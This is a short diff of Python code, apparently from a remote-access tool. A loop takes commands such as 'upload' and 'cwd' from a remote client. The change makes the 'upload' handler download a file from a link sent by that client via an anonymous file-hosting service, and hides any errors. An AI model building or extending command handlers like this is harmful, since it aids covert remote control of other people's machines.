@@ -107,9 +107,11 @@ while True:
  
         elif data == 'upload':
           anon = AnonFile()
-          link = str(client.recv(4096), 'utf-8')
-          print(link)
-          anon.download(link)
+          try: 
+           link = str(client.recv(4096), 'utf-8')
+           anon.download(link)
+          except:
+           pass
 
         elif data == 'cwd':
           try:
